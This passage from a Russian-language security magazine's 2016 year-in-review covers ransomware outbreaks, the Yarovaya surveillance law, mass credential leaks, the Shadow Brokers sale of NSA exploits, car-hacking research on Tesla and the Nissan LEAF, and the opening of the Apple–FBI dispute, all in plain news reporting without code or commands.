аналогичный проект Ленона Лейте (Lenon Leite), который выложил на GitHub
proof of concept код вымогателя Heimdall, созданного для атак на веб-серве-
ры, с целью последующего шифрования данных. Разумеется, тоже «в образо-
вательных целях». Кроме того, в декабре 2016 года специалисты компании G
Data нашли на GitHub репозиторий с исходниками шифровальщика CryptoWire.
На базе этого опенсорсного вредоноса создано уже три семейства настоя-
щих вымогателей: одноименный CryptoWire, S!Ri и UltraLocker.
   Как уже было сказано, в 2016 году от вымогательского ПО страдали
не только простые пользователи, но и университеты, СМИ, правоохранитель-
ные органы, правительственные учреждения и даже представители автоспор-
та: одна из команд NASCAR подвергалась атаке TeslaCrypt и рассталась с дан-
ными, стоимость которых оценивается в несколько миллионов долларов.
   Также шифровальщики в этом году неоднократно доставляли неприятности
медицинским учреждениям. К примеру, работу Голливудского пресвитериан-
ского медицинского центра (Hollywood Presbyterian Medical Center) полностью
остановило заражение неназванным вымогательским ПО. Больница была вы-
нуждена передать некоторых пациентов другим клиникам и отказаться от ис-
пользования техники, вернувшись к ручке и бумаге. В итоге руководство цен-
тра выплатило злоумышленникам почти 17 тысяч долларов выкупа.





В ноябре 2016 года шифровальщик HDDCryptor едва не парализовал работу
San Francisco Municipal Railway (буквально: муниципальная железная дорога
Сан-Франциско, сокращено Muni) — оператора общественного транспор-
та города и округа Сан-Франциско. Транспортная система включает в себя
пять видов общественного транспорта — это автобус, троллейбус, скорост-
ной трамвай, исторический электрический трамвай и исторический кабельный
трамвай.
  В результате атаки 2112 систем организации из 8656 оказались зараже-
ны, пострадали платежные системы, системы, отвечающие за расписание
движения транспорта, а также почта. В результате по всему городу переста-
ли работать автоматы продажи билетов, сотрудники были вынуждены распи-
сание движения транспорта писать от руки, а пассажиры принялись выклады-
вать в социальные сети фотографии компьютеров Muni, на экранах которых
отображалось сообщение с требованием выкупа. За восстановление досту-
па к системам автор HDDCryptor потребовал от организации 100 биткойнов
(около 73 тысяч долларов на тот момент). В итоге Muni несколько дней функ-
ционировала совершенно бесплатно, ведь иначе движение общественного
транспорта пришлось бы остановить и Сан-Франциско ждал бы неминуемый
транспортный коллапс.

Другие интересные материалы по данной теме:
• Шифровальщик Popcorn Time разрешает своим жертвам не платить выкуп,
  если они смогут заразить малварью других людей
• Криптовымогатель использует протокол мессенджера Telegram для связи
  со своими операторами
• Хакерские войны: авторы Petya и Mischa слили в Сеть ключи конкурирующе-
  го шифровальщика Chimera
• В составе приложения Transmission обнаружили
  первый работающий вымогатель для macOS
• Шифровать чужие файлы — это модно, даже банковские трояны на всякий
  случай обзаводятся такой функциональностью
• Компании готовы платить вымогателям выкуп и заранее запасают биткойны
  на случай атак шифровальщиков



«ПАКЕТ ЯРОВОЙ»
Одним из наиболее резонансных событий года в законодательной сфере,
бесспорно, было принятие так называемого пакета Яровой. Историческим
днем стало 7 июля 2016 года, когда президент РФ Владимир Путин подписал
пакет антитеррористических законопроектов (№ 1039149-6), разработанный
депутатом Ириной Яровой и сенатором Виктором Озеровым. Президент также
раздал поручения Минпромторгу, Минкомсвязи и ФСБ, которые должны будут
проследить за выполнением новых законов и разработать ряд новых норм.
   Пакет законопроектов вступает в силу 1 июля 2018 года, после чего органи-
заторы распространения информации в сети Интернет будут обязаны «предо-
ставлять в федеральный орган исполнительной власти в области обеспечения
безопасности информацию, необходимую для декодирования принимаемых,
передаваемых, доставляемых или обрабатываемых электронных сообщений».
Фактически это означает, что все приложения, которые работают с приме-
нением шифрования, обязаны предоставить ключи для расшифровки данных
спецслужбам.
   Организаторами распространения информации, согласно закону, считают-
ся «лица, осуществляющие деятельность по обеспечению функционирования
информационных систем и (или) программ», которые используются для «при-
ема, передачи, доставки и (или) обработки электронных сообщений пользо-
вателей сети Интернет». То есть под действие закона подпадают практически
все и вся, а не только мессенджеры и почтовые сервисы. И совершенно неяс-
но, как быть с протоколом HTTPS в целом, MIME, финансовыми системами (к
примеру, SWIFT) и так далее.
   Еще одна поправка «антитеррористического пакета» касается призывов
к террористической деятельности и оправдания терроризма в социальных се-
тях. Теперь они приравниваются к заявлениям в СМИ, а максимальное наказа-
ние составляет до семи лет лишения свободы.
   Стоит отметить, что законопроекты касаются отнюдь не только интерне-
та. К примеру, операторов связи обяжут хранить записи телефонных звонков
и все сообщения, которыми обмениваются пользователи, в течение полугода.
Метаданные и вовсе будут сохраняться на протяжении трех лет.
   Представители индустрии резко осудили подписание «пакета Яровой».
Даже если оставить за скобками все противоречия Конституции РФ, дело
как минимум в том, что для хранения требуемого объема информации потре-
буются огромные мощности, дата-центры, оборудование и так далее. Пред-
ставители операторов связи предупреждают, что в Центральной России про-
блемой может стать даже обеспечение таких дата-центров электроэнергией,
не говоря уже обо всем остальном. В итоге претворение законопроектов
в жизнь потребует от операторов связи колоссальных расходов, которые оце-
ниваются в несколько триллионов рублей. При этом представители Минэко-
номразвития, которые совместно с Госдумой работают над поправками к ан-
титеррористическому пакету законов, признают, что даже «оборудования
такого класса и в таком количестве на сегодняшний день нет нигде, в том чис-
ле за рубежом».
  В конце декабря 2016 года представители Минкомсвязи обнародовали
подзаконные акты для антитеррористического пакета, и, увы, ни о каких смяг-
чениях речи в документах пока не идет. Так, предложено установить срок хра-
нения всего трафика пользователей («текстовые сообщения, голосовая ин-
формация, изображения, звуки, видео- и иные сообщения пользователей
услуг связи») на максимальном уровне в шесть месяцев, а также обязать опе-
раторов связи хранить 1 Пбайт данных на каждый гигабит в секунду пропуск-
ной способности (а после 1 января 2019 года — 2 Пбайт).


Другие интересные материалы по данной теме:
• Реакция индустрии на принятие «пакета Яровой» в цитатах
• Новая доктрина информационной безопасности. Почему за атаки на крити-
  ческую инфраструктуру РФ предлагают сажать на десять лет





                           Продолжение статьи
    Начало статьи
ВСЕ САМОЕ ИНТЕРЕСНОЕ
 ЗА 2016 ГОД
   ДАЙДЖЕСТ САМЫХ ЗАМЕТНЫХ И ИНТЕРЕСНЫХ
        СОБЫТИЙ ЗА ПРОШЕДШИЙ ГОД



КАК ВОДА СКВОЗЬ ПАЛЬЦЫ
2016 год определенно запомнится и как год масштабных утечек данных. Де-
сятки крупных сервисов были скомпрометированы, в результате чего инфор-
мация миллиардов пользователей попала в руки третьих лиц. Более того, не-
взирая на все призывы специалистов, пользователи по-прежнему применяют
одни и те же пароли для разных сайтов и сервисов, и эти пароли сложно на-
звать надежными.
   Благодаря такому повсеместному распространению password reuse, а так-
же доступности в онлайне огромного числа разнообразных и относительно
свежих БД, хакеры в этом году стали чаще практиковать старый добрый брут-
форс. Так, в июне 2016 года администрация GitHub предупредила пользова-
телей, что неизвестные злоумышленники попытались брутфорсом взломать
«большое количество» аккаунтов ресурса. Точное число пострадавших учет-
ных записей названо не было, но руководство сервиса решило сбросить па-
роли для всех них. При этом официальное сообщение гласило, что сам GitHub
не был взломан или скомпрометирован иным образом. Администрация ресур-
са предположила, что массовый брутфорс был спровоцирован чередой круп-
ных утечек данных.
   Середина 2016 года действительно ознаменовалась серией массовых
сливов информации. Все началось с того, что минувшим летом хакер, извест-
ный под псевдонимом Peace_of_mind (или просто Peace), выставил на прода-
жу в даркнете данные о 167 370 940 аккаунтах LinkedIn. Злоумышленник от-
метил, что пароли представлены только для 117 миллионов аккаунтов (хеши
SHA-1 без соли).
   Официальные представители LinkedIn вскоре подтвердили, что информа-
ция подлинная, но утечка оказалась не новой и была датирована 2012 годом.
Тогда, четыре года назад, злоумышленники по горячим следам опубликова-
ли лишь 6,5 миллиона украденных учетных данных, а компания признала факт
взлома и инициировала обнуление паролей пострадавших. Но, как выясни-
лось в этом году, старая атака затронула куда больше пользователей.





Хотя после публикации объявления Peace_of_mind представители LinkedIn
спешно озаботились обнулением паролей, это не уберегло от взлома многих
известных личностей. Хакеры из группы OurMine все лето развлекались тем,
что взламывали аккаунты знаменитостей в социальных сетях. Все их жертвы
имели аккаунты в LinkedIn. В списках пострадавших от рук хакеров числятся:
Марк Цукерберг (глава Facebook, взломаны Pinterest и Twitter), Дик Косто-
ло (бывший глава Twitter, взломаны Pinterest и Twitter), Сундар Пичаи (глава
Google, взломан аккаунт Quora, сообщения хакеров дублировались в Twitter),
Эв Уильямс (сооснователь Twitter, Blogger и Medium, взломан Twitter), Дэниел
Эк (руководитель Spotify, взломан Twitter) и Брендан Айриб (глава Oculus Rift,
взломан Twitter), а также ютюбер PewDiePie, голливудский актер Ченнинг Татум
и многие другие.
   Однако 117 миллионов паролей от аккаунтов LinkedIn стали лишь нача-
лом. Пару недель спустя все тот же Peace_of_mind выставил на продажу БД
MySpace, содержащую 427 484 128 паролей и 360 213 024 почтовых адреса,
а также информацию о 65 469 298 аккаунтах Tumblr.
   Происхождение базы MySpace так и осталось тайной, а вот когда были
скомпрометированы 65 миллионов пользователей Tumblr, удалось разобрать-
ся ИБ-эксперту Трою Ханту (Troy Hunt), основателю агрегатора утечек «Have
 I Been Pwned?». Дело в том, что в мае 2016 года разработчики Tumblr сооб-
щали, что им стало известно о взломе, который произошел еще в 2013 году.
Тогда компания уверяла, что атака затронула очень малое число пользовате-
лей. Как выяснилось, на самом деле пострадавших было 65 миллионов. Един-
ственной хорошей новостью было то, что, по данным Ханта и согласно сооб-
щениям Peace_of_mind, Tumblr использовал алгоритм SHA-1 и благодаря соли
взломать пароли не так-то просто. По сути, база оказалась просто списком
email-адресов, из-за чего Peace_of_mind продавал БД всего за 0,4255 биткой-
на (около 225 долларов на тот момент).
   Чуть позже среди «лотов» хакера также появилась и база аккаунтов Twitter,
которая, по заверениям хакера, содержит данные 379 миллионов пользо-
вателей. Хотя ежемесячное число активных пользователей Twitter колеблет-
ся в районе 310 миллионов, можно предположить, что дамп также содержал
данные о неактивных пользователях. В базе можно найти email-адреса (в том
числе и вторичные для некоторых аккаунтов), имена пользователей и пароли
в виде обычного текста.
   Эту утечку изучали представители агрегатора утечек LeakedSource. Иссле-
дователи, равно как и официальные представители Twitter, выразили уверен-
ность в том, что сервис не подвергался атакам или взлому, хотя дамп и был
признан подлинным. Исследователи предположили, что информацию об акка-
унтах Twitter похищала некая малварь, действуя через популярные браузеры
(Chrome или Firefox).
   Свою теорию в LeakedSource подкрепили следующими аргументами.
Во-первых, Twitter совершенно точно не хранит пароли в формате обычного
текста. Исследователи считают, что утечка датируется примерно 2014 годом,
и тогда Twitter тоже не хранил пароли открыто. Во-вторых, для многих аккаун-
тов в базе вместо пароля значится <blank> или null, а некоторые браузеры со-
храняют пароли именно в формате <blank>, когда пользователь не ввел пароль
при сохранении учетных данных. Также исследователям показался странным
список самых популярных среди утекших аккаунтов почтовых доменов. Дело
в том, что многие из них принадлежат российским сервисам, что снова наводит
на мысли о малвари, которая действовала на территории России и стран СНГ.
   Говоря о российских пользователях, нельзя не отметить, что Peace_of_mind
также продавал информацию о 100 544 934 аккаунтах «ВКонтакте» (ФИО поль-
зователей, email-адреса, номера телефонов и пароли в виде открытого тек-
ста). Хакер уточнял, что пароли исходно поставлялись в текстовом формате,
а не были взломаны уже после хака. Также он объяснил, что «ВКонтакте» взло-
мали не недавно: по его информации, взлом произошел между 2011 и 2013
годами, тогда привязка номера телефона к аккаунту еще не была обязатель-
ной, поэтому далеко не для всех пользователей в базе представлены теле-
фонные номера. Пресс-секретарь «ВКонтакте» Евгений Красников опроверг
сообщения о взломе социальной сети и сообщил, что «взлома базы данных
„ВКонтакте“ не было, речь идет о старой базе логинов и паролей, которую мо-
шенники собирали в период с 2011 по 2012 год».
   Еще одна крупная утечка данных, связанная с российским сервисом, прои-
зошла в сентябре 2016 года. На этот раз в руки операторов LeakedSource попал
дамп, содержащий данные 98 167 935 пользователей Rambler.ru. По данным
исследователей, база датирована 17 февраля 2012 года, то есть утечка не была
результатом какой-либо новой атаки, как и во многих описанных случаях.
  В дампе содержались имена пользователей, их email-адреса (в основном
@rambler.ru), пароли и номера некогда популярного мессенджера ICQ. Инте-
ресно, что пароли в базе были представлены без какого-либо шифрования
и хеширования: они хранились в виде обычного текста.
   Представители «Рамблера» отнеслись к произошедшему спокойно и дали
следующий комментарий: «Про эту базу мы давным-давно знаем, это старая
и неактуальная информация. Никакой проблемы здесь нет: эта база всплы-
вала еще в 2014 году, после ее анализа мы выявили, что скомпрометированы
4 миллиона активных пользователей — всем им пароли, разумеется, были из-
менены».
   Также 2016 год стал настоящей черной полосой для компании Yahoo. Неу-
дачи начались в августе, когда в продаже появился дамп с данными 200 мил-
лионов пользователей Yahoo. В базе содержались имена пользователей, хеши
паролей MD5 и даты рождения. Также для некоторых аккаунтов была доступна
информация об email-адресе, стране проживания и почтовом индексе (только
для американских аккаунтов). Базу продавал все тот же Peace_of_mind, кото-
рый сообщил, что утечка датирована 2012 годом.
   Затем,  в  сентябре  2016  года,  представители  Yahoo  опубликовали
пресс-релиз, в котором признали, что компания пострадала от утечки дан-
ных. Многие решили, что Yahoo просто хочет подтвердить легитимность дам-
па Peace_of_mind, но все оказалось несколько хуже. Выяснилось, что утечка
произошла в 2014-м, а не в 2012 году и от нее пострадали по меньшей мере
500 миллионов пользователей. Согласно официальным данным компании,
в похищенной базе содержались имена пользователей, email-адреса, номера
телефонов, даты рождения, парольные хеши (в основном bcrypt), а также се-
кретные вопросы и ответы на них как в зашифрованном, так и в открытом виде.
Кроме того, пожалуй, самой неожиданной частью пресс-релиза оказалось за-
явление Yahoo о подозрениях компании, что данная утечка стала результатом
атаки неназванных «правительственных хакеров».
   Но, как это ни парадоксально, оказалось, что даже слив данных о 500 мил-
лионах аккаунтов — это не худшее, что могло произойти с Yahoo. 14 декабря
2016 года компания сообщила, что внутреннее расследование выявило еще
одну утечку данных, от которой суммарно пострадали более миллиарда (sic!)
пользователей.
   «В ноябре правоохранительные органы предоставили в наше распоряже-
ние файлы, которые, по утверждениям третьей стороны, содержали данные
о пользователях Yahoo. Мы провели анализ этих данных и привлекли сторон-
них криминалистов. Удалось установить, что информация, по всей видимости,
действительно является пользовательскими данными Yahoo.
   Дальнейшее изучение, проведенное криминалистами, показало, что в ав-
густе 2013 года неавторизованная третья сторона сумела похитить данные,
касающиеся более чем миллиарда аккаунтов. Нам не удалось определить,
как произошло вторжение, повлекшее за собой хищение данных», — гласило
официальное заявление компании.
   Если кажется, будто хуже уже некуда, замечу: при этом представите-
ли Yahoo подчеркнули, что данный инцидент не имеет никакого отношения
к предыдущим утечкам. То есть за этот год компания Yahoo призналась в том,
что суммарно у нее похитили данные более чем полутора миллиардов пользо-
вателей. Только вдумайся в эту цифру.
   Все это не только скверно повлияло на отношение пользователей к Yahoo,
также под вопросом оказалась сделка с Verizon Communications Inc., которая
минувшим летом выражала готовность приобрести Yahoo за почти пять милли-
ардов долларов. Теперь акции Yahoo значительно упали в цене, на репутации
компании появилось несколько значительных пятен, и, судя по всему, сделка
с Verizon может попросту не состояться.


Другие интересные материалы по данной теме:
• Yahoo обвинили в сотрудничестве со спецслужбами. Компания якобы шпио-
  нила за пользователями по требованию властей
• Исследователи ИБ-стартапа HEROIC заполучили дамп,
  содержащий данные 33 380 559 пользователей QIP.ru
• В 2012 году музыкальный сервис Last.fm постра-
  дал от атаки, в результате которой компрометации
  подверглась информация 43 570 999 пользователей
• Dropbox еще в 2012 году
  допустил кражу информации о 68 680 741 пользователе
• Данные о 25 миллионах аккаунтов со старых форумов игровых проектов
   Mail.Ru стали достоянием общественности
• Разработчики MongoDB расстроены тем, что администраторы не в состоя-
  нии настраивать БД правильно и тем самым провоцируют утечки данных
• Почему утечки данных помогают превратить брутфорс
  в эффективное оружие
• Крупнейший слив компромата в истории: немецкое издание Suddeutsche
   Zeitung и члены Международного консорциума журналистских расследова-
  ний опубликовали 2,6 Тбайт данных (11,5 миллиона файлов), принадлежа-
  щих юридической фирме Mossack Fonseca из Панамы



ХАК-ГРУППА THE SHADOW BROKERS И ВЗЛОМ АНБ
В августе 2016 года никому ранее не известная хакерская группа, называ-
ющая себя The Shadow Brokers, выступила с амбициозным заявлением. The
Shadow Brokers приложили немало усилий, чтобы распространить свое сооб-
щение, рассылая ссылки на него различным СМИ и медиаагентствам. Хакеры
уведомляли, что взломали другую хак-группу Equation Group и теперь готовы
продать «кибероружие АНБ», устроив аукцион. При чем здесь АНБ? Дело в том,
что многие эксперты и исследователи давно связывают деятельность Equation
Group с американским правительством. К примеру, «Лаборатория Касперско-
го» еще в 2015 году сообщала, что группа ведет свою деятельность на протя-
жении почти двадцати лет (с 1996 года) и ее действия затронули тысячи, а воз-
можно, и десятки тысяч пользователей более чем в 30 странах мира. Известно,
что за годы работы Equation Group взаимодействовала с другими кибергруппи-
ровками, в частности с организаторами нашумевших кампаний Stuxnet и Flame.
   Как выяснилось, The Shadow Brokers не лгали. В качестве доказательств
взлома хакеры опубликовали ряд скриншотов и два защищенных паролями ар-
хива, в которых содержались файлы Equation Group, то есть то самое «киберо-
ружие АНБ». Пароль был предоставлен лишь для одного из архивов, который
служил «бесплатным демо». Содержимое второго архива группировка надея-
лась продать.
   Первыми тревогу забили компании Cisco и Fortinet, когда их специалистам
удалось подтвердить, что эксплоиты, похищенные у АНБ и опубликованные ха-
керами, представляют реальную угрозу для их продуктов. Более того, серьез-
ность проблемы удалось оценить не сразу: изначально сообщалось, что ин-
струменты EXTRABACON, EPICBANANA и JETPLOW направлены на уязвимости
в продукции Cisco, но эксперты полагали, что проблемам подвержены только
модельная линейка ASA, файрволы PIX и Cisco Firewall Services Modules. Ско-
ро выяснилось, что это не совсем так. 0day-уязвимость CVE-2016-6366, най-
денная после публикации хакерских инструментов, также представляла угрозу
и для новейших моделей Cisco Adaptive Security Appliance (ASA).
   Вскоре подлинность инструментов из обнародованного хакерами дампа
подтвердили и представители компании Juniper Networks. Специалисты компа-
нии предупредили, что эксплоиты The Shadow Brokers представляют опасность
для межсетевых экранов NetScreen, работающих под управлением ScreenOS.
Никакой конкретикой относительно эксплоитов исследователи не поделились,
лишь заявили: «Анализ показывает, что инструменты направлены на бутлоадер
и не эксплуатируют какие-либо уязвимости в устройствах ScreenOS».
   Хотя никаких сомнений в подлинности «кибероружия АНБ» уже не остава-
лось, в довесок подлинность опубликованных данных подтвердили специали-
сты «Лаборатории Касперского», многие независимые исследователи, а из-
дание The Intercept и вовсе опубликовало новую порцию документов из архива
Эдварда Сноудена. Как оказалось, в некогда секретных бумагах фигурируют
те же самые инструменты, которые стали достоянием общественности благо-
даря The Shadow Brokers.
  В частности, в документах Сноудена был упомянут инструмент под назва-
нием SECONDDATE. Эта утилита позволяет провести на пользователя атаку
man in the middle и незаметно перенаправить его на сервер, подконтрольный
АНБ, где жертву уже поджидает малварь. Опубликованное руководство АНБ
гласит, что SECONDDATE надлежит использовать с MSGID-идентификатором
ace02468bdf13579.
   Однако вся эта шумиха не помогла The Shadow Brokers продать вторую
часть дампа. Изначально хакеры собирались реализовать наиболее ценные
инструменты спецслужб на аукционе. Правила торгов, объявленные в августе,
были предельно просты: нужно было перечислять деньги на биткойн-кошелек
группы. Выиграть должен был тот, чья ставка окажется самой высокой, и побе-
дитель будет только один. При этом подчеркивалось, что остальным участни-
кам аукциона деньги не вернут. Похоже, The Shadow Brokers были полностью
уверены в успехе своей затеи. Хакеры писали, что если суммарно будет со-
брано более миллиона биткойнов (примерно 568 миллионов долларов на тот
момент), то в качестве жеста доброй воли и благодарности всем участникам
торгов файлы Equation Group будут опубликованы бесплатно и для всех.
  В начале октября 2016 года в своем блоге на платформе Medium хакеры
сообщили, что аукцион проходит совсем не так хорошо, как они надеялись.
Желающих тратить крупные суммы, не имея никаких гарантий, попросту не на-
шлось. Тогда The Shadow Brokers ответили на самые частые вопросы потен-
циальных покупателей и посетовали, что вокруг одни только трусы, которые
боятся рисковать. Но и это воззвание к общественности не возымело успеха,
потому что уже в конце ноября The Shadow Brokers опубликовали еще одно,
четвертое по счету послание, подписанное тем же PGP-ключом, что и преды-
дущие три. В сообщении хакеры объявили, что аукцион отменяется. Вместо
этого группа предложила своего рода краудфандинг: хакеры пообещали об-
народовать оставшиеся эксплоиты АНБ в открытом доступе, как только сете-
вая общественность совместными усилиями соберет 10 тысяч биткойнов.
   По всей видимости, идея с краудфандингом тоже себя не оправдала. В се-
редине декабря 2016 года исследователь, известный как Boceffus Cleetus, об-
наружил, что хакеры используют ZeroNet и уже пытаются продать эксплоиты
порознь. ZeroNet — это платформа для распределенного хостинга сайтов, ис-
пользующая в работе блокчейн и BitTorrent.
   Судя по информации, опубликованной Boceffus Cleetus, теперь The Shadow
Brokers пробуют продать похищенные у АНБ инструменты не единым архивом,
а поштучно. Длинный список инструментов, обнародованный на их сайте, раз-
делен на категории (эксплоиты, трояны, импланты), а рядом с каждым «лотом»
указана цена. Стоимость инструментов варьируется от 1 до 100 биткойнов (от
780 до 78 тысяч долларов), кроме того, весь набор можно приобрести сразу,
по фиксированной цене 1000 биткойнов (780 тысяч долларов).

АВТОХАКИ
Если проблема умных холодильников, кофеварок, роутеров и прочих IoT-гад-
жетов уже оформилась и дает о себе знать, об опасностях, которые сопряже-
ны с современными автомобилями, пока говорят мало. Однако машины тоже
«умнеют» день ото дня, на электронику и софт возлагают все больше задач
и ответственности, да и беспилотные автомобили постепенно становятся поч-
ти повседневным явлением.
  В 2016 году сразу несколько исследователей обратили внимание на без-
опасность современных авто, а начало года ознаменовалось тем, что General
Motors стала первым автопроизводителем после Tesla Motors, запустившим
собственную bug bounty программу. И программы вознаграждений за найден-
ные уязвимости определенно нужны автопроизводителям. К примеру, в 2016
году сразу две группы исследователей продемонстрировали удаленный взлом
автомобилей Tesla.
   Первыми были специалисты компании Tencent Keen Security Lab, которые
взломали Tesla Model S P85 и Model 75D, проэксплуатировав несколько уязви-
мостей, найденных в наиболее свежем на тот момент ПО компании.
   Демонстрацию атаки исследователи сняли на видео и опубликовали
на YouTube. В ролике сотрудники и директор Tencent Keen Security Lab пока-
зывают удаленный перехват контроля над различными системами автомобиля
с расстояния 12 миль (почти 20 км). Исследователи смогли удаленно разбло-
кировать двери машины, получили контроль над экраном приборной панели,
смогли включить дворники, повернуть зеркала, перенастроить положение си-
дений, открыть багажник, а также активировать тормоза, пока автомобиль на-
ходился в движении.
   Тогда разработчики Tesla сообщили, что на устранение проблем им по-
надобилось всего десять дней. «Обнаруженная проблема срабатывает лишь
во время использования браузера и требует, чтобы автомобиль подключился
к вредоносной точке доступа Wi-Fi и находился неподалеку. По нашим оцен-
кам, риск для пользователей весьма низок», — прокомментировали предста-
вители компании.
   Специалисты норвежской компании Promon, в свою очередь, решили подой-
ти к вопросу автохаков с другой стороны и атаковали Android-приложение Tesla.
   По умолчанию во время установки официального приложения Tesla владе-
лец авто должен ввести имя пользователя и пароль, для которых приложение
сгенерирует токен OAuth. Впоследствии, когда пользователь вновь обраща-
ется к приложению, оно использует данный токен, так что повторно вводить
учетные данные не требуется. Исследователи Promon обнаружили, что при-
ложение Tesla хранит токен OAuth в формате обычного текста, в директории
sandbox. И атакующий способен прочитать токен, если только ему удастся по-
лучить доступ к смартфону жертвы.
   Специалисты пишут, что в наши дни совсем несложно создать вредонос-
ное приложение для Android, которое содержало бы root-эксплоиты, напри-
мер Towelroot или Kingroot. Эксплоиты помогут повысить привилегии приложе-
ния в системе, а затем прочесть или подменить данные других приложений.
Но просто узнать токен автовладельца недостаточно. Заполучив токен, ха-
кер сможет проделать с машиной ряд действий, но не сумеет ее завести —
для этого ему понадобится пароль владельца. Впрочем, исследователи при-
думали, как справиться и с этим. Если вредоносное приложение удалит токен
OAuth с устройства жертвы, ей придется вновь ввести имя и пароль. То есть
у атакующего появится прекрасная возможность перехватить учетные данные.
Кроме того, специалисты пришли к выводу, что атакующий может без особо-
го труда внести изменения в код приложения Tesla. Если благодаря малвари
у злоумышленника уже есть root-доступ к устройству, ему будет совсем нетруд-
но настроить пересылку копии учетных данных владельца авто на свой сервер.
   Имея на руках токен, а также учетные данные от официального приложе-
ния Tesla, хакер может направить серверам Tesla правильно составленные
HTTP-запросы, используя токен и, если понадобится, юзернейм и пароль
жертвы. В итоге у злоумышленника появится возможность завести двигатель
без ключа, открыть двери, отследить машину. В теории возможностей куда
больше, но весь их спектр на практике исследователи не проверяли.
  В итоге специалисты Promon рекомендовали инженерам Tesla использо-
вать в своих приложениях двухфакторную аутентификацию, а также не хранить
OAuth-токены в виде простого текста. Кроме того, для защиты от перехвата па-
ролей исследователи советуют применять кастомную раскладку клавиатуры.
   Проблемы в официальном приложении нашлись и у Nissan LEAF — одно-
го из самых продаваемых электрокаров в мире. Брешь в безопасности изучил
эксперт по ИБ Трой Хант (Troy Hunt), хотя первыми ее обнаружили пользовате-
ли одного канадского автофорума.
   Официальное приложение  Nissan Connect позволяет владельцу авто
контролировать некоторые функции своей машины удаленно. Оказалось,
что для идентификации приложение использует исключительно VIN (Vehicle
 Identification Number) автомобиля и ничего больше. Сначала дыру в API заме-
тили пользователи и, не осознавая того, что это огромная брешь в безопасно-
сти, даже создали альтернативную версию приложения Nissan Connect.
   Узнав чужой VIN (который зачастую написан прямо на лобовом стекле ав-
томобиля), не получится удаленно завести двигатель, у приложения нет такой
функции. С другой стороны, LEAF — это электромобиль, так что злоумышлен-
ник, к примеру, может удаленно разрядить его батарею, подложив тем самым
свинью владельцу.
   Когда информация о дырявом приложении дошла до Троя Ханта, владель-
ца известного ресурса «Have I Been Pwned?», он решил разобраться в пробле-
ме. Хант выяснил, что приложение будто нарочно было создано безо всякой
защиты. На портале LEAF нет никакой системы авторизации, а на мобильном
устройстве пользователя не сохраняется токен безопасности, который мог бы
запретить доступ к машине всем, кроме ее владельца. Фактически, узнав чу-
жой VIN, атакующий может подключиться к серверам Nissan, в том числе через
обычный браузер. Злоумышленник может не только получить определенный
контроль над системами авто (включить или выключить климат-контроль, обо-
грев сидений или посмотреть уровень заряда батареи), но и узнать информа-
цию об автомобиле, в том числе получить доступ к истории поездок.
  В результате изысканий Ханта компания временно приостановила работу
Nissan Connect, извинилась перед владельцами автомобилей и пообещала
в самом скором времени выпустить новую, безопасную версию приложения.
   Еще одним заметным событием из области автохаков стало раскрытие ис-
ходных кодов проекта Comma One, за созданием которого стоит известный
исследователь и хакер Джордж Хоц aka GeoHot. Напомню, GeoHot известен
тем, что в семнадцать лет сумел джейлбрейкнуть iPhone, а затем взломал Sony
PlayStation 3, из-за чего компания Sony долго пыталась юридически его пре-
следовать (впрочем, безрезультатно).
   Взявшись за проект Comma One, Хоц с нуля создал систему, которая может
превратить обычный автомобиль в беспилотный. Нет, система Comma One
подходила не для любой машины — она предназначалась только для установ-
ки на определенные модели Honda Civic и Acura. За последний год Хоц много
рассказывал о своем проекте инвесторам и журналистам, объяснял, что в ос-
нове этого «внешнего автопилота» лежит самообучающаяся нейросеть.





Изначально GeoHot планировал выйти на рынок с комплектами Comma One,
предназначенными для самостоятельной установки на авто, и продавать их
по цене 999 долларов, но вскоре на его планах поставило крест Национальное
управление по безопасности движения автотранспорта (National Highway Traffic
Safety Administration, NHTSA). В октябре 2016 года представители NHTSA при-
слали Хоцу письмо, в котором потребовали предоставить все данные о Comma
One до 10 ноября 2016 года. Дело в том, что в NHTSA всерьез обеспокоились
из-за разработки Хоца и ее возможного несоответствия стандартам безопас-
ности. Там сочли, что Comma One может создать риск для других участников
дорожного движения, и пригрозили разработчику крупным штрафом. В резуль-
тате продажи Comma One так и не стартовали, а Хоц заморозил проект.
   После этого Хоц решил пойти другим путем. 30 ноября 2016 года разра-
ботчик собрал в Сан-Франциско пресс-конференцию, где объявил, что софт,
лежавший в основе Comma One (openpilot), теперь будет открытым. Исходни-
ки тут же были опубликованы на GitHub. Однако без аппаратной составляющей
openpilot практически бесполезен, поэтому Хоц также представил «аппаратную
платформу для исследовательской деятельности» Comma Neo. Собрать такое
устройство можно при помощи 3D-принтера и смартфона OnePlus 3, и Хоц уже
опубликовал подробный мануал (pdf).
   Когда разработчика спросили, как же он теперь планирует заработать
на этом деньги, Хоц не смутился и ответил: «Как вообще зарабатывают день-
ги? Наша цель — создание собственной сети. Нам нужна собственная сеть
беспилотных автомобилей».


Другие интересные материалы по данной теме:
• На портале BMW обнаружили 0day-уязвимости, которые позволяли
  удаленно взламывать автомобили
• Ключи от миллионов авто Volkswagen Group можно подделать с помощью
  дешевого RF-трансивера на базе Arduino
• Отключить сигнализацию гибрида Mitsubishi Outlander PHEV можно через
   Wi-Fi



APPLE VS ФБР
Противостояние, развернувшееся в начале 2016 года между ФБР и ком-
панией Apple, долгое время оставалось в центре внимания всей индустрии.
Этот спор стал прямым олицетворением разногласий между правительством
США и представителями IT-рынка, и от его исхода зависело многое. После
терактов в Париже в правительстве США куда громче, чем прежде, заговори-
ли о том, что end-to-end шифрование — это плохо, а компании стоит обязать
оснащать свою продукцию бэкдорами для спецслужб. Компания Apple, в свою
очередь, давно выступает категорически против такой политики и известна
тем, что с гордостью заявляет: вскрыть шифрование устройств Apple и полу-
чить доступ к данным пользователей не могут даже сами специалисты Apple.
   Все началось утром 2 декабря 2015 года, когда в здание центра для людей
с ограниченными возможностями города Сан-Бернардино ворвались Сайед
Ризван Фарук и Ташфин Малик и открыли стрельбу. В итоге террористы убили
четырнадцать человек и ранили более двадцати, а их самих спустя несколько
часов ликвидировали сотрудники полиции. Вскоре был найден iPhone 5c, при-
надлежавший Фаруку.
   Разумеется, информация со смартфона террориста могла помочь устано-
вить причины теракта и даже его возможных заказчиков, так что совсем неу-
дивительно, что ФБР получило доступ к iCloud-бэкапу устройства. Однако
бэкапы оказались старыми, так как Фарук, судя по всему, предусмотрительно
отключил эту функцию. Сам смартфон, конечно же, был заблокирован, данные
на нем зашифрованы, а на ввод PIN-кода, как обычно, отводилось лишь десять
попыток с задержками между ними. В результате представители ФБР были вы-
нуждены получить ордер у федерального судьи и обратиться к Apple за помо-
щью. Однако помогать Apple отказалась.
   Из текста ордера следует, что правоохранители не предлагали Apple со-
